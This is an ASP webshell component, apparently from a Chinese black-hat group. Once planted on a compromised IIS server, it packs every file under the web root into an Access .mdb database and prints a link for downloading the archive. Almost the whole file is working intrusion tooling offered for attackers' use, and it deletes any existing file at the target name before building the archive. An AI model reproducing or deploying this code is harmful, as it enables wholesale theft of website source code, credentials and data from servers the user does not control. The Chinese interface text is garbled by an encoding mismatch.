<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>XiaoC-[<%=Request.ServerVariables("LOCAL_ADDR")%>]�ļ����ASP�汾(2010��9��17��)</title>
</head>
<style type="text/css">
body{font-size:12px; color:#333333;font-family:Arial, Helvetica, sans-serif;}
a:link,a:hover,a:active,a:visited{text-decoration:none; color:#000}
input{border: 1px solid #cccccc; padding: 1px;}
.input{border-style: none;}
.mainbox{ margin:0 auto;width:960px; height:auto; border:solid 1px #91d70d;}
.header{ background-color:#91d70d; height:28px; color:#000;vertical-align:middle; font-weight:bold; }
.header #name{ float:left; text-indent:1.5em;width:480px; text-align:left; line-height:28px;vertical-align:middle;}
.header #author{float:right; width:400px; text-align:right;line-height:28px;vertical-align:middle; padding-right:15px;}
.mainbox .text{ margin-right:auto;margin-left:auto; margin-top:10px;margin-bottom:10px;width:500px; height:auto; border:solid 1px #91d70d;}
.mainbox .text #title{text-align:center;color:red;}
.mainbox .text #warn{text-align:center;color:red; font-weight:bold;}
.mainbox .text #tab{ text-indent:1.5em;line-height:28px; vertical-align:middle; text-align:center;}
.mainbox .bottom{background-color:#91d70d; line-height:28px; color:#000;vertical-align:middle; font-weight:bold; text-align:center}
</style>
<body>
	<div class="mainbox">
		<div class="header"><span id="name">Webshell�ļ����-ASP�汾[IP:<%=Request.ServerVariables("LOCAL_ADDR")%>]</span><span id="author">By XiaoC [<a href="http://81sec.com" title="Some Advice to XiaoC...">81sec.com</a>]</span>
        </div>
		<div class="text">
			<div id="title">-=ʹ��˵��=-[Know It,Then Hack It...]</div>
            <ol>
            	<li>backup.asp---�������</li>
                <li>Release.vbs---���ؽ�ѹ����</li>
                <li>������̣������ļ�����ʼ���������mdb�ļ�������Release.vbs��ѹ</li>
                <li>���˵�����������mdb�ļ���Release.vbs����ͬһĿ¼�¼���</li>
            </ol>
            <div id="warn">������������ڼ�����ر��������������Ҫ�ȴ�һ��ʱ�䣡�����������ʾ...</div>
            <%
				if request("action")<>"backup" then
			%>
			<div id="tab">
            <form action="?action=backup" method="post" name="backup">
             ������ļ���(.MDB)��<input type="text" name="mdbfile" value="xiaoc.mdb" style="height:15px" />&nbsp;&nbsp;<input type="submit" value="��ʼ���"  style="height:19px;"/>
            </form>
            </div>
            <%
				else
				response.Write("<ul>")
				filename=request.Form("mdbfile")
				dim dbfile,fso,sql
				' ����Ҫ���ݳɵ����ݿ������ɱ���Ĭ��
				if filename<>"" then 
					mdbfile=filename
				response.Write("<li>���Ѿ��޸���Ĭ�ϴ���ļ���Ϊ"&filename&"...</li>")
				else
				mdbfile="xiaoc.mdb" 
				response.Write("<li>������Ĭ�ϴ���ļ���ΪxiaoC.mdb</li>")
				end if
				dbfile=server.MapPath(mdbfile)
				Set FSO = CreateObject("Scripting.FileSystemObject")
				'������ݿ���ھ�ɾ��ԭ������
				if fso.FileExists(dbfile) then
					fso.DeleteFile(dbfile)
					response.write("<li>�����Ѿ����ڸô���ļ����Ѿ�ɾ����׼���ؽ�...</li>")
				end if
				set fso=nothing
				'��ʼ�������ݿ�
				set cat=server.CreateObject("ADOX.Catalog")
				'����access2000�����ݿ�
				cat.Create "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & dbfile
				set cat=nothing
				if err.number=0 then
				Response.Write "<li>�������ݿ� " & dbfile & " �ɹ�</li>"
				else
				Response.Write "<li>���ݿⴴ��ʧ�ܣ�ԭ�� " & err.description&"</li>"
				Response.End
				end if
				Set Conn = Server.CreateObject("ADODB.Connection")
				'��ʼ����
				Conn.Open "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & dbfile
				'������
				sql="Create TABLE filedata([id] counter PRIMARY KEY,[path] Memo,[file] General)"
				conn.execute(sql)
				Set rs = CreateObject("ADODB.RecordSet")
				rs.Open "FileData", conn, 1, 3
				set obj=server.createobject("scripting.filesystemobject")
				'�����վ��Ŀ¼
				set objfolder=obj.getfolder(server.mappath("/"))
				'��ʼ�����ļ�
				search objfolder
				response.write("<li><font color=red>Over!�����ɣ�������"&filename&"���ɣ�һ���ļ��ϴ��Ƽ�Ѹ�����أ�</font></li>")
				response.Write "<li style='text-align=center;'>�������ӣ�<a href=http://"& Request.ServerVariables("SERVER_NAME")&left(request.ServerVariables("PATH_INFO"),instrrev(request.ServerVariables("PATH_INFO"),"/"))&filename&" target=_blank>�������</a></li>"
				response.Write("</ul>")
				end if
			%>
		</div>
        <div class="bottom"><a href="http://www.bhst.org" target="_blank" title="�й���ñ��ȫС����̳">China Black-Hat Security Team</a></div>
	</div>
</body>
</html>
<%
' �ؼ��������ļ���������
function search(objfolder)
	dim objsubfolder
	for each objfile in objfolder.files
	Set objStream = Server.CreateObject("ADODB.Stream")
	a=a+1
	objStream.Type = 1
	objStream.Open
	response.write "<li>�ļ�"&objfile.path&"���ڴ��...</li>"
	if right(objfile.path,len(mdbfile))=mdbfile or right(objfile.path,4)=".ldb" then
	' ��ֹ�����������ݿ����ʱ�ļ�
	else
	objStream.LoadFromFile objfile.path
	rs.addnew
	rs("file")=objstream.read
	rs("Path")=right(objfile.path,len(objfile.path)-3)
	rs.update
	objStream.close
	end if
	next
	for each objsubfolder in objfolder.subfolders
	search objsubfolder  ' �ݹ������ļ�
	next
end Function
%>
